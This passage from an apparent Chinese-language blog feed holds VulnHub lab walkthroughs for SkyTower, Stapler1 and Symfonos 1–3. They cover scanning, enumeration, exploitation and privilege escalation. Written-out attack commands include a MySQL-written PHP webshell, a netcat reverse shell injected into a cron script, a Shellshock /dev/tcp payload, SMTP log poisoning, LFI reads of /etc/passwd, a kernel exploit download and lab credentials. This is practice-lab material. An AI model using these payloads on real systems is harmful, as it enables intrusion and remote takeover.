<p>其实如果没有获取交互shell，也可以通过mysql -e来执行命令</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -p xxxxxx -e &quot;show databases;&quot;</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/11.png" alt="11"></p>
<p>尝试另外两个账户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sara&#x2F;ihatethisjob</span><br><span class="line">william&#x2F;senseable</span><br></pre></td></tr></table></figure>

<p>这两个账号同样需要绕过.bashrc的限制</p>
<p>在sara用户下，我们发现了sudo权限</p>
<p><img src="/images/SkyTower-1/12.png" alt="12"></p>
<p>虽然只能在accounts目录下使用，但这是一个很傻的决定</p>
<p><img src="/images/SkyTower-1/13.png" alt="13"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo ls &#x2F;accounts&#x2F;..&#x2F;root</span><br><span class="line">sudo cat &#x2F;accounts&#x2F;..&#x2F;root&#x2F;flag.txt</span><br></pre></td></tr></table></figure>

<p><img src="/images/SkyTower-1/14.png" alt="14"></p>
<p>直接找到一些有意思的东西，获取root</p>
<p><img src="/images/SkyTower-1/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Stapler1</title>
    <url>/2020/09/13/%E9%9D%B6%E5%9C%BAStapler1/</url>
    <content><![CDATA[<h1 id="Stapler1"><a href="#Stapler1" class="headerlink" title="Stapler1"></a>Stapler1</h1><p>kali:192.168.1.201</p>
<p>目标:192.168.1.207</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.207 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.207 -oN nmap</span><br></pre></td></tr></table></figure>

<p>nmap发现</p>
<p>21(ftp),22(SSH),53(DNS),80(http),139(smb),666,3306(mysql),12380(http)</p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>ftp允许匿名登录，发现文件，<code>put</code>无法写入</p>
<p><img src="/images/Stapler1/2.png" alt="2"></p>
<p>发现了潜在的用户名</p>
<p>smb枚举</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbmap -H 192.168.1.207 -R --depth 5 -P 139</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/1.png" alt="1"></p>
<p>web目录枚举<br>分别枚举80端口和12380端口，但都没有什么发现<br>可以发现，手动尝试访问12380端口的任意文件，都会返回400。所以手动尝试https访问(之前的Nmap并没有扫描出SSL信息，看来是遗漏了)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">gobuster dir -w &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;dirbuster&#x2F;directory-list-2.3-medium.txt -u https:&#x2F;&#x2F;192.168.1.207:12380 -t 50 -k</span><br><span class="line"></span><br><span class="line">&#x2F;announcements&#x2F;</span><br><span class="line">&#x2F;phpmyadmin&#x2F;</span><br><span class="line">&#x2F;icons&#x2F;</span><br><span class="line">&#x2F;javascript&#x2F;</span><br><span class="line">&#x2F;server-status&#x2F;</span><br></pre></td></tr></table></figure>

<p>再运行nikto，发现了robots.txt</p>
<p><img src="/images/Stapler1/3.png" alt="3"></p>
<p>手动检查这些目录，可以发现有价值的信息</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;blogblog&#x2F;		wordpress</span><br><span class="line">&#x2F;phpmyadmin&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接用wpscan进行扫描</p>
<p>先进行了vp扫描，但是只发现了akismet，而该插件基本都是xss<br>我们可以手动尝试枚举，或进行更详细的ap扫描</p>
<p>手动</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;wp-content&#x2F;plugins&#x2F;</span><br><span class="line">https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F;wp-content&#x2F;plugins&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/8.png" alt="8"></p>
<p>ap扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token **** --url https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F; --disable-tls-checks --enumerate ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>这次我们发现了信息</p>
<p><img src="/images/Stapler1/4.png" alt="4"></p>
<p>直接寻找公开漏洞</p>
<p><img src="/images/Stapler1/5.png" alt="5"></p>
<p>修改exp</p>
<p><img src="/images/Stapler1/6.png" alt="6"></p>
<p>尝试运行</p>
<p><img src="/images/Stapler1/7.png" alt="7"></p>
<p>这里会遇到一个非常常见的SSL验证错误，我们可以取消证书验证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ssl</span><br><span class="line"></span><br><span class="line">ssl._create_default_https_context &#x3D; ssl._create_unverified_context</span><br></pre></td></tr></table></figure>

<p>这样脚本运行成功，现在分析一下它的行为<br>它似乎包含了一个非常重要的文件wp-config.php，并以图片的格式进行了上传</p>
<p>我们访问<a href="https://192.168.1.207:12380/blogblog/%E5%8F%AF%E4%BB%A5%E5%8F%91%E7%8E%B0%E7%A1%AE%E5%AE%9E%E5%A4%9A%E4%BA%86%E5%87%A0%E7%AF%87%E6%96%87%E7%AB%A0%EF%BC%8C%E7%8E%B0%E5%9C%A8%E9%9C%80%E8%A6%81%E6%89%BE%E5%88%B0%E5%AE%83%E7%9A%84%E4%BD%8D%E7%BD%AE">https://192.168.1.207:12380/blogblog/可以发现确实多了几篇文章，现在需要找到它的位置</a><br>简单寻找，可以在<a href="https://192.168.1.207:12380/blogblog/wp-content/uploads/%E5%8F%91%E7%8E%B0%E5%AE%83%E4%BB%AC%E7%9A%84%E4%BD%8D%E7%BD%AE">https://192.168.1.207:12380/blogblog/wp-content/uploads/发现它们的位置</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -k https:&#x2F;&#x2F;192.168.1.207:12380&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;1791571933.jpeg</span><br></pre></td></tr></table></figure>

<p>我们就可以轻松读取到这些信息</p>
<p><img src="/images/Stapler1/10.png" alt="10"></p>
<p>当然也可以利用LFI读取其他文件，只要先去访问LFI漏洞页面，就会在uploads生成文件，访问即可，比如/etc/passwd</p>
<p><img src="/images/Stapler1/11.png" alt="11"></p>
<p>现在我们获得了mysql的凭据，我们可以尝试远程登录到mysql</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql -u root -h 192.168.1.207 -pplbkac</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/12.png" alt="12"></p>
<h3 id="方法1wordpress后台"><a href="#方法1wordpress后台" class="headerlink" title="方法1wordpress后台"></a>方法1wordpress后台</h3><p>在获取mysql会话后，我们可以应该想到读取wordpress存储的用户凭证，在后台getshell，这是一个比较简单快捷的方式</p>
<p><img src="/images/Stapler1/13.png" alt="13"></p>
<p>将该表保存到文件<code>hash</code>中，提取第四段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk -F &#39;|&#39; &#39;&#123;print $4&#125;&#39; hash &gt;hash.txt</span><br></pre></td></tr></table></figure>

<p>逐个用john破解密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">john password --wordlist&#x3D;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到凭据<code>john/incorrect</code></p>
<p>后台登录安装插件</p>
<p><img src="/images/Stapler1/14.png" alt="14"></p>
<p>不知道文件插件被安装到哪里了，返回到wp-content里寻找</p>
<p><img src="/images/Stapler1/15.png" alt="15"></p>
<p>成功发现，这样就可以getshell了</p>
<p><img src="/images/Stapler1/16.png" alt="16"></p>
<h3 id="方法2mysql写shell"><a href="#方法2mysql写shell" class="headerlink" title="方法2mysql写shell"></a>方法2mysql写shell</h3><p>可以直接使用mysql的outfile尝试写webshell到常见的web目录中，看是否有运气</p>
<p>尝试直接写到web跟目录失败，权限问题<br>尝试写到uploads目录，成功</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select &quot;&lt;?php system($_GET[&#39;cmd&#39;]); ?&gt;&quot; into outfile &quot;&#x2F;var&#x2F;www&#x2F;https&#x2F;blogblog&#x2F;wp-content&#x2F;uploads&#x2F;evil.php&quot;;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/17.png" alt="17"></p>
<p>这样我们就可以获得RCE</p>
<p><img src="/images/Stapler1/18.png" alt="18"></p>
<p>可以通过它来进行反弹shell</p>
<p><img src="/images/Stapler1/19.png" alt="19"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas扫描</p>
<h3 id="方法1内核提权"><a href="#方法1内核提权" class="headerlink" title="方法1内核提权"></a>方法1内核提权</h3><p><img src="/images/Stapler1/20.png" alt="20"></p>
<p>寻找exp</p>
<p><img src="/images/Stapler1/21.png" alt="21"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.1.201&#x2F;tmp&#x2F;39772.zip</span><br><span class="line">unzip 39772.zip</span><br><span class="line">cd 39772</span><br><span class="line">tar -xvf exploit.tar</span><br><span class="line">cd ebpf_mapfd_doubleput_exploit</span><br><span class="line">compile.sh</span><br></pre></td></tr></table></figure>

<p>编译会产生警告，忽略它们</p>
<p><img src="/images/Stapler1/22.png" alt="22"></p>
<p>运行即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;doubleput</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/23.png" alt="23"></p>
<h3 id="方法2计划任务"><a href="#方法2计划任务" class="headerlink" title="方法2计划任务"></a>方法2计划任务</h3><p><img src="/images/Stapler1/24.png" alt="24"></p>
<p><img src="/images/Stapler1/25.png" alt="25"></p>
<p><img src="/images/Stapler1/26.png" alt="26"></p>
<p>找到了可以写入的计划任务，是个shell脚本，直接写入</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;rm &#x2F;tmp&#x2F;ff;mkfifo &#x2F;tmp&#x2F;ff;cat &#x2F;tmp&#x2F;ff|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc 192.168.1.201 5555 &gt;&#x2F;tmp&#x2F;ff&quot; &gt; &#x2F;usr&#x2F;local&#x2F;sbin&#x2F;cron-logrotate.sh</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/27.png" alt="27"></p>
<h3 id="方法3历史命令"><a href="#方法3历史命令" class="headerlink" title="方法3历史命令"></a>方法3历史命令</h3><p>寻找当前账户可以读取的.bash_history</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;home -name &quot;.bash_history&quot; -exec cat &#123;&#125; \;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Stapler1/28.png" alt="28"></p>
<p>发现可以切换到peter</p>
<p><img src="/images/Stapler1/29.png" alt="29"></p>
<p>而且发现，peter属于sodo组，并能sudo任何程序</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo &#x2F;bin&#x2F;bash -p</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 2</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-2/</url>
    <content><![CDATA[<h1 id="Symfonos-2"><a href="#Symfonos-2" class="headerlink" title="Symfonos 2"></a>Symfonos 2</h1><p>kali:192.168.1.201<br>目标:192.168.1.231</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.231 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.231 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-2/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>这里21不允许匿名登录<br>尝试枚举smb</p>
<p><img src="/images/Symfonos-2/2.png" alt="2"></p>
<p>发现了log.txt</p>
<p>首先发现它一件事，备份了/etc/shadow到/var/backups/shadow.bak<br>之后是它的smb配置</p>
<p><img src="/images/Symfonos-2/3.png" alt="3"></p>
<p>其中发现anonymous文件夹分享的位置</p>
<p><img src="/images/Symfonos-2/5.png" alt="5"></p>
<p>再往下，还有ftp的配置</p>
<p><img src="/images/Symfonos-2/4.png" alt="4"></p>
<p>发现了ftp存在的用户aeolus</p>
<p>80端口无法枚举，看来有WAF</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>考虑搜索ProFTPD的公开漏洞</p>
<p><img src="/images/Symfonos-2/6.png" alt="6"></p>
<p>文件复制那个漏洞看起来可以利用，mod_copy的RCE需要知道web的目录，这个不知道，但是可以盲猜测默认web目录</p>
<p><img src="/images/Symfonos-2/8.png" alt="8"></p>
<p>看来可能是/var/www/html不存在，要不然就是该目录无法写入，或者没有解释环境如php<br>尝试文件复制，我们已经得到了smb的分享目录，我们可以把想要复制的东西拷过去，这个漏洞利用不需要凭据，也不需要匿名登录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">site cpfr &#x2F;var&#x2F;backups&#x2F;shadow.bak</span><br><span class="line">site cpto &#x2F;home&#x2F;aeolus&#x2F;share&#x2F;shadow.bak</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/9.png" alt="9"></p>
<p>获取了shadow文件</p>
<p><img src="/images/Symfonos-2/10.png" alt="10"></p>
<p>密码可以john进行破解，可以破解出aeolus，但是cronus不能</p>
<p><img src="/images/Symfonos-2/12.png" alt="12"></p>
<p>或者根据用户名进行ftp或者ssh的破解，这里我就爆破ftp了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hydra -l aeolus -P &#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt -f ftp:&#x2F;&#x2F;192.168.1.231</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/7.png" alt="7"></p>
<p>得到了凭据<code>aeolus/sergioteamo</code><br>尝试ssh</p>
<p><img src="/images/Symfonos-2/11.png" alt="11"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas枚举，但是没找到可以提权的点，<code>sudo -l</code>为空<br>linpeas没有枚举出本地的看房端口，检查一下发现没有netstat，我们可以用ss来检查</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ss -tnl</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/13.png" alt="13"></p>
<p>发现了本地开放端口8080<br>而且还发现，这似乎是由cronus运行的一个apache服务</p>
<p><img src="/images/Symfonos-2/14.png" alt="14"></p>
<p>使用ssh隧道进行本地端口转发</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ssh -L 0.0.0.0:9999:127.0.0.1:8080 aeolus@192.168.1.231</span><br></pre></td></tr></table></figure>

<p>之后发现</p>
<p><img src="/images/Symfonos-2/15.png" alt="15"></p>
<p>搜索librenms漏洞</p>
<p><img src="/images/Symfonos-2/16.png" alt="16"></p>
<p>发现msf有利用模块<br>linux/http/librenms_addhost_cmd_inject需要登录凭据，我们就使用aeolus的</p>
<p><img src="/images/Symfonos-2/17.png" alt="17"></p>
<p>成功获取了cronus的shell<br>检查sudo发现了mysql</p>
<p><img src="/images/Symfonos-2/18.png" alt="18"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo mysql -e &#39;\! &#x2F;bin&#x2F;sh&#39;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-2/19.png" alt="19"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 1</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-1/</url>
    <content><![CDATA[<h1 id="Symfonos-1"><a href="#Symfonos-1" class="headerlink" title="Symfonos 1"></a>Symfonos 1</h1><p>kali:192.168.1.201<br>目标:192.168.1.202</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.202 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.202 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-1/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>smb枚举</p>
<p><img src="/images/Symfonos-1/2.png" alt="2"></p>
<p>发现对其中要给目录具有读权限，下载其中的文件，发现提示了我们用户的密码<br>尝试用改密码访问另一个smb目录helios</p>
<p>尝试后发现，凭据为<code>helios/qwerty</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">smbclient &#x2F;&#x2F;192.168.1.202&#x2F;helios -U helios</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/3.png" alt="3"></p>
<p>查看下载的文件，提示了我们一个路径</p>
<p><img src="/images/Symfonos-1/4.png" alt="4"></p>
<p>尝试访问，发现了wordpress站点</p>
<p><img src="/images/Symfonos-1/5.png" alt="5"></p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>直接进行完整的插件扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wpscan --api-token xxxxxx --url http:&#x2F;&#x2F;192.168.1.202&#x2F;h3l105&#x2F; -e ap --plugins-detection aggressive</span><br></pre></td></tr></table></figure>

<p>发现了3个插件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">akismet</span><br><span class="line">mail-masta</span><br><span class="line">site-editor</span><br></pre></td></tr></table></figure>

<p>其中akismet遇到过很多次，是个比较安全的插件</p>
<p><img src="/images/Symfonos-1/6.png" alt="6"></p>
<p>寻找公开漏洞</p>
<p><img src="/images/Symfonos-1/7.png" alt="7"></p>
<p>大概有3个洞可以用，开始尝试</p>
<p><strong>mail masta的LFI</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;192.168.1.202&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;site-editor&#x2F;editor&#x2F;extensions&#x2F;pagebuilder&#x2F;includes&#x2F;ajax_shortcode_pattern.php?ajax_path&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/8.png" alt="8"></p>
<p><strong>site editor的漏洞</strong></p>
<p>sql注入需要admin的凭证，无法直接利用</p>
<p>LFI都是可以利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;symfonos.local&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/9.png" alt="9"></p>
<p>所以总共发现了两个LFI</p>
<p>这里的渗透过程很像<code>vulnhub Wintermute</code>对方也开启了25 Postfix smtp<br>尝试污染日志，写入shell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">telnet 192.168.1.245 25</span><br><span class="line">MAIL FROM: &quot;evil &lt;?php phpinfo(); system($_GET[&#39;cmd&#39;]); ?&gt;&quot;</span><br><span class="line">RCPT TO: ROOT</span><br><span class="line">data					</span><br><span class="line">evil	</span><br><span class="line">.						</span><br></pre></td></tr></table></figure>

<p>尝试包含<code>/var/mail/mail.log</code>，但是失败了，猜测文件估计是存在的，但应该有一些其他的问题<br>回到包含的/etc/passwd里，发现了普通用户helios，尝试包含它的日志</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;symfonos.local&#x2F;h3l105&#x2F;wp-content&#x2F;plugins&#x2F;mail-masta&#x2F;inc&#x2F;campaign&#x2F;count_of_send.php?pl&#x3D;&#x2F;var&#x2F;mail&#x2F;helios</span><br></pre></td></tr></table></figure>

<p>这次成功了，phpshell已经写入，可以发现，虽然邮件是RCPT给ROOT的，但日志还是被写入了，估计这些服务都是运行在<code>helios</code>用户下</p>
<p>直接反弹shell，果然shell是helios不是www-data，mail.log无法包含是由于权限不足</p>
<p><img src="/images/Symfonos-1/10.png" alt="10"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>发现了奇怪的SUID程序</p>
<p><img src="/images/Symfonos-1/11.png" alt="11"></p>
<p>nc传输到kali</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -lvp 443 &gt; statuscheck</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.1.201 443 &lt; &#x2F;opt&#x2F;statuscheck</span><br></pre></td></tr></table></figure>

<p>顺便检查一下md5</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum -b statuscheck</span><br></pre></td></tr></table></figure>

<p>没有问题后检查该文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file statuscheck </span><br><span class="line">chmod 777 statuscheck </span><br><span class="line">ltrace .&#x2F;statuscheck </span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/12.png" alt="12"></p>
<p>发现通过环境变量调用了curl，知道就好办了</p>
<p>我们在对方tmp目录下编译</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">int main ( int argc, char *argv[] )</span><br><span class="line">&#123;</span><br><span class="line">        setreuid(0,0);</span><br><span class="line">        execve(&quot;&#x2F;bin&#x2F;sh&quot;, NULL, NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/13.png" alt="13"></p>
<p>或者直接调用/bin/sh就行了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &#39;&#x2F;bin&#x2F;sh&#39; &gt; &#x2F;tmp&#x2F;curl</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;curl</span><br><span class="line">export PATH&#x3D;&#x2F;tmp</span><br><span class="line">&#x2F;opt&#x2F;statuscheck</span><br><span class="line"></span><br><span class="line">export PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;bin:&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;games:&#x2F;usr&#x2F;games</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-1/14.png" alt="14"></p>
<p>获取root后检查之前打算包含的/var/log/mail.log，可以确认如果不是权限问题，确实可以使用</p>
<p><img src="/images/Symfonos-1/15.png" alt="15"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 3</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-3/</url>
    <content><![CDATA[<h1 id="Symfonos-3"><a href="#Symfonos-3" class="headerlink" title="Symfonos 3"></a>Symfonos 3</h1><p>kali:192.168.1.201<br>目标:192.168.1.205</p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">masscan -p1-65535 192.168.1.205 --rate&#x3D;1000 -e eth0 &gt; ports</span><br><span class="line">ports&#x3D;$(cat ports | awk -F &quot; &quot; &#39;&#123;print $4&#125;&#39; | awk -F &quot;&#x2F;&quot; &#39;&#123;print $1&#125;&#39; | sort -n | tr &#39;\n&#39; &#39;,&#39; | sed &#39;s&#x2F;,$&#x2F;&#x2F;&#39;)</span><br><span class="line">nmap -Pn -sV -sC -p$ports 192.168.1.205 -oN nmap</span><br></pre></td></tr></table></figure>
<p><img src="/images/Symfonos-3/1.png" alt="1"></p>
<h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p>80进行目录枚举</p>
<p><img src="/images/Symfonos-3/2.png" alt="2"></p>
<p>再对gate进行枚举，没有发现</p>
<h2 id="渗透"><a href="#渗透" class="headerlink" title="渗透"></a>渗透</h2><p>看来只能对cgi-bin枚举了，与cgi关联的漏洞有shellshock，尝试使用这个字典去扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;usr&#x2F;share&#x2F;seclists&#x2F;Discovery&#x2F;Web-Content&#x2F;CGIs.txt</span><br></pre></td></tr></table></figure>

<p>很快被BAN，还是尝试直接枚举cgi-bin/</p>
<p><img src="/images/Symfonos-3/3.png" alt="3"></p>
<p>枚举到了一个目录，尝试访问</p>
<p><img src="/images/Symfonos-3/4.png" alt="4"></p>
<p>刷新之后会变动，看来实在运行uptime命令</p>
<p>直接给它来一发shellshock的exp</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl -H &#39;User-Agent: () &#123; :; &#125;; &#x2F;bin&#x2F;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;192.168.1.201&#x2F;443 0&gt;&amp;1&#39; http:&#x2F;&#x2F;192.168.1.205&#x2F;cgi-bin&#x2F;underworld&#x2F;</span><br></pre></td></tr></table></figure>

<p><img src="/images/Symfonos-3/5.png" alt="5"></p>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>linpeas枚举，发现了有用的Capabilities</p>
<p><img src="/images/Symfonos-3/6.png" alt="6"></p>
<p>为了确定抓取的对象，pspy进行检测</p>
<p><img src="/images/Symfonos-3/7.png" alt="7"></p>
<p>发现了ftpclient.py，我们无法查看它的内容甚至执行权限，只能查看上一级目录，可以猜测它和这个hades有关</p>
<p><img src="/images/Symfonos-3/9.png" alt="9"></p>
<p>接着开始抓包</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tcpdump -i any -w capture.cap -v</span><br></pre></td></tr></table></figure>

<p>传到kali里分析流量</p>
<p><img src="/images/Symfonos-3/8.png" alt="8"></p>
<p>成功发现了一些东西，hades的用户凭证，切换过去<br>之后再查看那个定时任务的权限</p>
<p><img src="/images/Symfonos-3/10.png" alt="10"></p>
<p>并不能够修改<br>linpeas再次枚举</p>
<p><img src="/images/Symfonos-3/11.png" alt="11"></p>
<p>发现了组权限可写，看到之前的ftpclient.py调用了ftplib，我们可以去查看</p>
<p><img src="/images/Symfonos-3/12.png" alt="12"></p>
<p>确实可以写，我们直接写一个反弹shell，这样执行的root就会反弹shell给我们了</p>
<p><img src="/images/Symfonos-3/13.png" alt="13"></p>
<p>打开pspy看它执行，就能获取root</p>
<p><img src="/images/Symfonos-3/14.png" alt="14"></p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>Linux靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>靶场Symfonos 4</title>
    <url>/2020/09/18/%E9%9D%B6%E5%9C%BASymfonos-4/</url>
    <content><![CDATA[<h1 id="Symfonos-4"><a href="#Symfonos-4" class="headerlink" title="Symfonos 4"></a>Symfonos 4</h1><p>kali:192.168.1.201<br>目标:192.168.1.215</p>
